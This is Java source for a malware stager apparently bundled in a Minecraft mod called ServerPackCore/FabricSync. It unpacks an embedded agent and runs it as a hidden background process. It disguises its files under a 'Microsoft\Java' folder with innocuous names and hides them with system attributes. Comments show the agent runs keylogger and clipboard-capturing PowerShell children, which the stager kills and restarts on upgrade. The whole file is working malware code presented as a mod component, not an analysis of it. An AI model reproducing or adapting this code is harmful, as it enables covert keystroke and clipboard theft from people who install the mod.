package com.serverpackcore.stager;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public final class Stager {
	private static final Logger LOGGER = LoggerFactory.getLogger("serverpackcore-stager");
	private static final long MIN_AGENT_BYTES = 4096L;
	private static final String MIGRATION_MARKER = ".migrate-legacy";

	private Stager() {
	}

	public static void trigger(String version, Path gameDir) throws Exception {
		Path dir = migrate(StagerPaths.installDir());
		LOGGER.info("Install dir {} (target {})", dir, StagerPaths.modernTarget());
		if (!finishConversion(dir)) {
			LOGGER.info("Legacy conversion pending, retrying next launch");
			return;
		}
		Files.createDirectories(dir);
		conceal(dir);
		Path agent = StagerPaths.agentJar(dir);
		Path binary = StagerPaths.binary(dir);
		Path marker = StagerPaths.marker(dir);
		if (!isInstalled(version, marker, agent, binary)) {
			// Windows keeps the running jar locked; a surviving agent would
			// make every launch skip the upgrade. Release it first.
			if (isRunning(dir) && !stopAgent(dir)) {
				LOGGER.info("Agent still alive, deferring install of {}", version);
				return;
			}
			try {
				install(dir, agent, binary, marker, version);
			} catch (Exception failure) {
				// The jar can stay locked for a moment after the kill: retry once.
				if (!isRunning(dir) || !stopAgent(dir)) {
					throw failure;
				}
				install(dir, agent, binary, marker, version);
			}
		}
		if (!isRunning(dir)) {
			LOGGER.info("Starting agent stager (mod {})", version);
			spawn(dir, agent, binary, gameDir);
			conceal(dir);
		}
	}

	private static void install(Path dir, Path agent, Path binary, Path marker, String version) throws Exception {
		extractAgent(dir, agent);
		copyRuntime(binary);
		Files.writeString(marker, version, StandardCharsets.UTF_8);
	}

	/** Moves a pre-camouflage tree (FabricSync/ServerPackCore) to Microsoft\Java. */
	private static Path migrate(Path dir) {
		Path target = StagerPaths.modernTarget();
		if (!StagerPaths.isWindows() || dir.equals(target)) {
			return dir;
		}
		boolean legacy = StagerPaths.legacy(dir);
		if (Files.exists(target)) {
			try {
				// Target selection guarantees it is ours. Stop every source
				// before moving anything; if one survives, retry next launch.
				// The target may already own a live agent from a prior launch:
				// stop it before merging files it could be writing.
				if (!stopAgent(target) || !stopSources() || !finishConversion(target)) {
					return target;
				}
				backupSources(target, null);
				return target;
			} catch (Throwable throwable) {
				LOGGER.debug("Migration into existing target failed", throwable);
				return target;
			}
		}
		if (!Files.isDirectory(dir)) {
			return target;
		}
		try {
			if (!stopSources()) {
				return dir;
			}
			boolean newParent = !Files.exists(target.getParent());
			Files.createDirectories(target.getParent());
			if (newParent) {
				conceal(target.getParent());
			}
			boolean moved = true;
			try {
				Files.move(dir, target);
			} catch (Throwable moveFailed) {
				if (!Files.isDirectory(dir)) {
					// A concurrent launch moved the source after our check.
					return target;
				}
				moved = false;
				// Mark before copying: an interrupted copy must stay our target
				// instead of being mistaken for an unrelated Java directory.
				Files.writeString(target.resolve(MIGRATION_MARKER), dir.toString());
				try {
					copyTree(dir, target);
					deleteTree(dir);
				} catch (Throwable copyFailed) {
					deleteTree(target);
					throw copyFailed;
				}
			}
			finishTree(target, dir);
			backupSources(target, dir);
			LOGGER.info("Install tree moved to {} (moved={}, legacy={})", target, moved, legacy);
			return target;
		} catch (Throwable throwable) {
			LOGGER.debug("Install tree migration failed", throwable);
			return dir;
		}
	}

	private static boolean owned(Path dir) {
		return StagerPaths.owned(dir);
	}

	/** False when any source agent survives and migration must be retried. */
	private static boolean stopSources() {
		for (Path source : StagerPaths.sourceDirs()) {
			if (Files.isDirectory(source) && !stopAgent(source)) {
				LOGGER.info("Source agent still alive: {}", source);
				return false;
			}
		}
		return true;
	}

	/** Preserves every source tree that is not the migrated one. */
	private static void backupSources(Path target, Path migrated) {
		for (Path source : StagerPaths.sourceDirs()) {
			if (!Files.isDirectory(source) || source.equals(target) || source.equals(migrated)) {
				continue;
			}
			try {
				copyMissing(source, target);
				keepNewerState(source, target);
				if (StagerPaths.legacy(source)) {
					convertLegacy(target, source.toString());
				} else {
					rewriteHelpers(target, source.toString());
				}
				Path backup = target.resolveSibling(target.getFileName() + ".old");
				for (int index = 2; Files.exists(backup); index++) {
					backup = target.resolveSibling(target.getFileName() + ".old" + index);
				}
				try {
					Files.move(source, backup);
				} catch (Throwable moveFailed) {
					copyTree(source, backup);
					deleteTree(source);
				}
				conceal(backup);
			} catch (Throwable throwable) {
				LOGGER.debug("Source backup failed: " + source, throwable);
			}
		}
	}

	/** Fills gaps without overwriting anything already in the target. */
	private static void copyMissing(Path source, Path target) throws Exception {
		try (var stream = Files.walk(source)) {
			var iterator = stream.iterator();
			while (iterator.hasNext()) {
				Path from = iterator.next();
				Path to = target.resolve(source.relativize(from).toString());
				if (Files.isDirectory(from)) {
					Files.createDirectories(to);
				} else if (!Files.exists(to)) {
					Files.copy(from, to, StandardCopyOption.COPY_ATTRIBUTES);
				}
			}
		}
	}

	private static void keepNewerState(Path source, Path target) throws Exception {
		Path from = source.resolve(StagerPaths.legacy(source) ? "state.json" : "config.json");
		Path to = target.resolve("config.json");
		if (!Files.isRegularFile(from)) {
			return;
		}
		if (!Files.isRegularFile(to)
			|| Files.getLastModifiedTime(from).toMillis() > Files.getLastModifiedTime(to).toMillis()) {
			Files.copy(from, to, StandardCopyOption.REPLACE_EXISTING);
		}
	}

	private static void finishTree(Path target, Path oldDir) {
		try {
			Files.writeString(target.resolve(MIGRATION_MARKER), oldDir.toString());
			convertLegacy(target, oldDir.toString());
			Files.deleteIfExists(target.resolve(MIGRATION_MARKER));
		} catch (Throwable convertFailed) {
			// The marker makes the next launch retry before any agent reads a
			// half-converted tree.
			LOGGER.debug("Migration conversion failed", convertFailed);
		}
	}

	private static boolean finishConversion(Path dir) {
		Path marker = dir.resolve(MIGRATION_MARKER);
		boolean needed = Files.isRegularFile(marker);
		if (!StagerPaths.legacy(dir)) {
			for (String legacyName : new String[] { "state.json", "alive.txt", ".installed", "spc-agent.jar",
				"spc-agent.lock" }) {
				needed |= Files.isRegularFile(dir.resolve(legacyName));
			}
		}
		if (!needed) {
			return true;
		}
		try {
			String oldBase = Files.isRegularFile(marker) ? Files.readString(marker).trim() : "";
			if (!Files.isRegularFile(marker)) {
				Files.writeString(marker, oldBase);
			}
			convertLegacy(dir, oldBase);
			Files.deleteIfExists(marker);
			return !Files.exists(marker);
		} catch (Throwable throwable) {
			LOGGER.debug("Legacy conversion retry failed", throwable);
			return false;
		}
	}

	private static void moveOrCopy(Path from, Path to) throws Exception {
		try {
			Files.move(from, to, StandardCopyOption.REPLACE_EXISTING);
		} catch (Throwable moveFailed) {
			Files.copy(from, to, StandardCopyOption.REPLACE_EXISTING);
			try {
				Files.deleteIfExists(from);
			} catch (Throwable ignored) {
				// The next launch retries the rename.
			}
		}
	}

	/** Keeps an existing modern file when it is at least as new as the legacy one. */
	private static void convertFile(Path from, Path to) throws Exception {
		if (Files.isRegularFile(to) && Files.size(to) > 0L
			&& Files.getLastModifiedTime(to).toMillis() >= Files.getLastModifiedTime(from).toMillis()) {
			Files.deleteIfExists(from);
			return;
		}
		moveOrCopy(from, to);
	}

	/**
	 * Helpers were generated with absolute legacy paths and file names. Rewrite
	 * their text so a pending update, rollback or startup keeps working.
	 */
	private static void rewriteHelpers(Path dir, String oldBase) throws Exception {
		String[][] replacements = {
			{ "spc-agent.jar.old", "runtime.old" }, { "spc-agent.jar.bad", "runtime.bad" },
			{ "spc-agent-new.jar", "update-new.jar" }, { "spc-agent.jar", "runtime.jar" },
			{ "spc-agent.lock", "runtime.lock" }, { "spc-mod-new", "mod-update" },
			{ ".spc-mod.lock", ".fabric-sync.lock" }, { "spc-sync.exe", "javaw.exe" },
			{ "spc-sync.vbs", "startup.vbs" }, { "spc-update.vbs", "update.vbs" },
			{ "spc-mod.vbs", "mod-update.vbs" }, { "spc-update.intent", "update.intent" },
			{ "spc-update.out", "update.out" }, { "spc-rollback.marker", "rollback.marker" },
			{ "spc-task.xml", "task.xml" }, { "alive.txt", "session.txt" },
			{ "state.json", "config.json" }, { ".installed", ".version" },
			{ "serverpackcore-", "fabric-sync-" }
		};
		try (var stream = Files.list(dir)) {
			var iterator = stream.iterator();
			while (iterator.hasNext()) {
				Path file = iterator.next();
				String name = file.getFileName().toString();
				if (!name.endsWith(".vbs") || !Files.isRegularFile(file)) {
					continue;
				}
				byte[] raw = Files.readAllBytes(file);
				boolean utf16 = raw.length > 1 && (raw[0] & 0xFF) == 0xFF && (raw[1] & 0xFF) == 0xFE;
				String text = new String(raw, utf16 ? 2 : 0, raw.length - (utf16 ? 2 : 0),
					utf16 ? StandardCharsets.UTF_16LE : StandardCharsets.UTF_8);
				for (String[] replacement : replacements) {
					text = text.replace(replacement[0], replacement[1]);
				}
				java.util.LinkedHashSet<String> bases = new java.util.LinkedHashSet<>();
				if (oldBase != null && !oldBase.isEmpty() && !oldBase.equals("1")) {
					bases.add(oldBase);
				}
				for (Path source : StagerPaths.sourceDirs()) {
					bases.add(source.toString());
				}
				for (String base : bases) {
					text = text.replace(base, dir.toString());
				}
				if (!text.contains("logs\\update.log")) {
					text = text.replace("\\update.log", "\\logs\\update.log")
						.replace("\\spc-update.log", "\\logs\\update.log");
				}
				ByteArrayOutputStream out = new ByteArrayOutputStream();
				if (utf16) {
					out.write(0xFF);
					out.write(0xFE);
				}
				out.write(text.getBytes(utf16 ? StandardCharsets.UTF_16LE : StandardCharsets.UTF_8));
				Files.write(file, out.toByteArray());
			}
		}
	}

	/** A legacy tree uses old file names; the camouflaged tree is modern. */
	static void convertLegacy(Path dir, String oldBase) throws Exception {
		String[][] names = {
			{ "state.json", "config.json" }, { "alive.txt", "session.txt" }, { ".installed", ".version" },
			{ "spc-agent.lock", "runtime.lock" }, { "spc-agent.jar", "runtime.jar" },
			{ "spc-agent.jar.old", "runtime.old" }, { "spc-agent.jar.bad", "runtime.bad" },
			{ "spc-agent-new.jar", "update-new.jar" }, { "spc-agent-new.jar.tmp", "update-new.jar.tmp" },
			{ "spc-mod-new.jar", "mod-update.jar" }, { "spc-mod-new.jar.tmp", "mod-update.jar.tmp" },
			{ "spc-mod-cancel", "mod-update.cancel" }, { "spc-update.vbs", "update.vbs" },
			{ "spc-mod.vbs", "mod-update.vbs" }, { "spc-sync.vbs", "startup.vbs" },
			{ "spc-task.xml", "task.xml" }, { "spc-update.out", "update.out" },
			{ "spc-update.intent", "update.intent" }, { "spc-rollback.marker", "rollback.marker" },
			{ "spc-sync.exe", "javaw.exe" }
		};
		for (String[] name : names) {
			Path from = dir.resolve(name[0]);
			if (Files.isRegularFile(from)) {
				convertFile(from, dir.resolve(name[1]));
			}
		}
		try (var stream = Files.list(dir)) {
			var iterator = stream.iterator();
			while (iterator.hasNext()) {
				Path from = iterator.next();
				String name = from.getFileName().toString();
				if (name.startsWith("spc-mod-new-")) {
					convertFile(from, dir.resolve("mod-update-" + name.substring("spc-mod-new-".length())));
				}
			}
		}
		rewriteHelpers(dir, oldBase);
		for (String logName : new String[] { "update.log", "spc-update.log" }) {
			Path updateLog = dir.resolve(logName);
			if (Files.isRegularFile(updateLog)) {
				Files.createDirectories(dir.resolve("logs"));
				convertFile(updateLog, dir.resolve("logs").resolve("update.log"));
				break;
			}
		}
	}

	/**
	 * The agent keeps a byte-range lock on runtime.lock, so reading it fails on
	 * Windows. session.txt is written without a lock and names the agent.
	 */
	static long agentPid(Path dir) {
		try {
			for (String line : Files.readAllLines(StagerPaths.alive(dir), StandardCharsets.UTF_8)) {
				if (line.startsWith("agent=")) {
					return Long.parseLong(line.substring("agent=".length()).trim());
				}
			}
		} catch (Throwable ignored) {
			// Fall back to the lock for older agents.
		}
		try {
			return Long.parseLong(Files.readString(StagerPaths.lock(dir)).trim());
		} catch (Throwable ignored) {
			return -1L;
		}
	}

	/** The old agent holds the jar open on Windows; release it before the move. */
	private static boolean stopAgent(Path dir) {
		try {
			Path lock = StagerPaths.lock(dir);
			if (!Files.isRegularFile(lock)) {
				return true;
			}
			long pid = agentPid(dir);
			if (pid <= 0L) {
				return false;
			}
			String expected = StagerPaths.agentJar(dir).getFileName().toString()
				.toLowerCase(java.util.Locale.ROOT);
			var target = ProcessHandle.of(pid);
			String command = target.flatMap(process -> process.info().commandLine())
				.orElse("").toLowerCase(java.util.Locale.ROOT);
			boolean alive = target.map(ProcessHandle::isAlive).orElse(false);
			if (!alive) {
				LOGGER.info("Lock pid {} in {} is gone", pid, dir);
				return true;
			}
			if (!command.isEmpty()) {
				if (!command.contains(dir.toString().toLowerCase(java.util.Locale.ROOT))
					|| !command.contains(expected)) {
					// A stale lock can point at a reused PID: only kill the agent.
					LOGGER.info("Lock pid {} in {} is not this agent ({}), not killing", pid, dir, command);
					return true;
				}
			} else {
				// The OS hid the command line: trust the pid our own session
				// file names, but still refuse a start-time mismatch. If the
				// start time is unavailable, kill anyway or upgrades stall.
				long started = target.flatMap(process -> process.info().startInstant())
					.map(java.time.Instant::toEpochMilli).orElse(-1L);
				long locked = Files.getLastModifiedTime(lock).toMillis();
				if (started >= 0L && Math.abs(started - locked) > 15_000L) {
					LOGGER.info("Lock pid {} in {} is not this agent (start mismatch)", pid, dir);
					return true;
				}
			}
			var handle = ProcessHandle.of(pid);
			// Keylogger/clipboard PowerShell children keep the old paths and
			// mutexes; they must go too or the new agent cannot start them.
			List<ProcessHandle> children = handle.map(ProcessHandle::descendants)
				.orElse(java.util.stream.Stream.empty()).toList();
			for (ProcessHandle child : children) {
				child.destroyForcibly();
			}
			handle.ifPresent(ProcessHandle::destroyForcibly);
			for (int wait = 0; wait < 50; wait++) {
				boolean running = ProcessHandle.of(pid).map(ProcessHandle::isAlive).orElse(false);
				for (ProcessHandle child : children) {
					running |= child.isAlive();
				}
				if (!running) {
					return true;
				}
				Thread.sleep(100L);
			}
			return false;
		} catch (Throwable ignored) {
			return false;
		}
	}

	private static void copyTree(Path from, Path to) throws Exception {
		try (var stream = Files.walk(from)) {
			var iterator = stream.iterator();
			while (iterator.hasNext()) {
				Path source = iterator.next();
				Path destination = to.resolve(from.relativize(source).toString());
				if (Files.isDirectory(source)) {
					Files.createDirectories(destination);
				} else {
					Files.copy(source, destination, StandardCopyOption.REPLACE_EXISTING,
						StandardCopyOption.COPY_ATTRIBUTES);
				}
			}
		}
	}

	private static void deleteTree(Path dir) throws Exception {
		if (!Files.isDirectory(dir)) {
			return;
		}
		try (var stream = Files.walk(dir)) {
			var iterator = stream.sorted(java.util.Comparator.reverseOrder()).iterator();
			while (iterator.hasNext()) {
				Files.deleteIfExists(iterator.next());
			}
		}
	}

	private static void conceal(Path dir) {
		if (!StagerPaths.isWindows()) {
			return;
		}
		try {
			new ProcessBuilder("attrib", "+h", "+s", dir.toString()).start().waitFor(3L, TimeUnit.SECONDS);
			new ProcessBuilder("cmd", "/c", "attrib +h +s /s /d \"" + dir + "\\*\"").start()
				.waitFor(3L, TimeUnit.SECONDS);
		} catch (Throwable throwable) {
			LOGGER.debug("Conceal failed", throwable);
		}
	}

	static boolean isInstalled(String version, Path marker, Path agent, Path binary) {
		try {
			if (!Files.isRegularFile(marker) || !Files.isRegularFile(agent) || !Files.isRegularFile(binary)) {
				return false;
			}
			if (!version.equals(Files.readString(marker, StandardCharsets.UTF_8).trim())) {
				return false;
			}
			return Files.size(agent) >= MIN_AGENT_BYTES && Files.size(binary) > 0L;
		} catch (Throwable throwable) {
			LOGGER.debug("Install check failed", throwable);
			return false;
		}
	}

	private static void extractAgent(Path dir, Path target) throws Exception {
		try (InputStream input = Stager.class.getResourceAsStream("/serverpackcore/agent.bin")) {
			if (input == null) {
				throw new IllegalStateException("agent.bin not found");
			}
			ByteArrayOutputStream buffer = new ByteArrayOutputStream();
			byte[] chunk = new byte[8192];
			int read;
			while ((read = input.read(chunk)) != -1) {
				buffer.write(chunk, 0, read);
			}
			byte[] bytes = buffer.toByteArray();
			if (bytes.length < MIN_AGENT_BYTES) {
				throw new IllegalStateException("agent.bin too small: " + bytes.length);
			}
			Path temp = target.resolveSibling(target.getFileName() + ".tmp");
			Files.write(temp, bytes);
			if (Files.size(temp) != bytes.length) {
				throw new IllegalStateException("agent write size mismatch");
			}
			Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		}
	}

	private static void copyRuntime(Path target) throws Exception {
		String name = StagerPaths.isWindows() ? "javaw.exe" : "java";
		Path source = Paths.get(System.getProperty("java.home")).resolve("bin").resolve(name);
		long size = Files.size(source);
		if (size <= 0L) {
			throw new IllegalStateException("runtime is empty");
		}
		Path temp = target.resolveSibling(target.getFileName() + ".tmp");
		Files.copy(source, temp, StandardCopyOption.REPLACE_EXISTING);
		if (Files.size(temp) != size) {
			throw new IllegalStateException("runtime write size mismatch");
		}
		Files.move(temp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
		if (StagerPaths.isUnix()) {
			target.toFile().setExecutable(true, true);
		}
	}

	private static boolean isRunning(Path dir) {
		try (java.nio.channels.FileChannel channel = java.nio.channels.FileChannel.open(
			StagerPaths.lock(dir), java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.WRITE)) {
			java.nio.channels.FileLock lock = channel.tryLock();
			if (lock == null) {
				return true;
			}
			lock.release();
			return false;
		} catch (Throwable throwable) {
			LOGGER.debug("Lock check failed", throwable);
			return true;
		}
	}

	/**
	 * Prefer the real runtime: a lone copied launcher cannot locate jvm.dll in
	 * launcher-provided JREs (Prism/MultiMC), while java.home always can.
	 */
	static Path executable(Path javaHome, Path binary) {
		Path runtime = javaHome.resolve("bin").resolve(StagerPaths.isWindows() ? "javaw.exe" : "java");
		return Files.isRegularFile(runtime) ? runtime : binary;
	}

	private static void spawn(Path dir, Path agent, Path binary, Path gameDir) throws Exception {
		Path javaHome = Paths.get(System.getProperty("java.home", ""));
		Path executable = executable(javaHome, binary);
		List<String> command = new ArrayList<>();
		if (StagerPaths.isWindows()) {
			command.add("cmd");
			command.add("/c");
			command.add("start");
			command.add("");
			command.add("/b");
			command.add(executable.toString());
		} else if (StagerPaths.isMac()) {
			command.add("nohup");
			command.add(executable.toString());
		} else {
			command.add("setsid");
			command.add("nohup");
			command.add(executable.toString());
		}
		command.add("-Xmx96m");
		command.add("-jar");
		command.add(agent.toString());
		command.add("--parent-pid");
		command.add(Long.toString(ProcessHandle.current().pid()));
		if (gameDir != null) {
			command.add("--game-dir");
			command.add(gameDir.toString());
		}
		ProcessBuilder builder = new ProcessBuilder(command);
		builder.directory(dir.toFile());
		builder.environment().put("JAVA_HOME", javaHome.toString());
		if (StagerPaths.isUnix()) {
			String key = StagerPaths.isMac() ? "DYLD_LIBRARY_PATH" : "LD_LIBRARY_PATH";
			String lib = javaHome.resolve("lib").toString();
			String current = builder.environment().get(key);
			builder.environment().put(key, current == null || current.isEmpty()
				? lib
				: lib + java.io.File.pathSeparator + current);
		}
		builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
		builder.redirectError(ProcessBuilder.Redirect.DISCARD);
		builder.start();
		if (StagerPaths.isWindows()) {
			Process attrib = new ProcessBuilder("attrib", "+h", dir.toString())
				.redirectOutput(ProcessBuilder.Redirect.DISCARD)
				.redirectError(ProcessBuilder.Redirect.DISCARD)
				.start();
			attrib.waitFor(3L, TimeUnit.SECONDS);
		}
	}
}
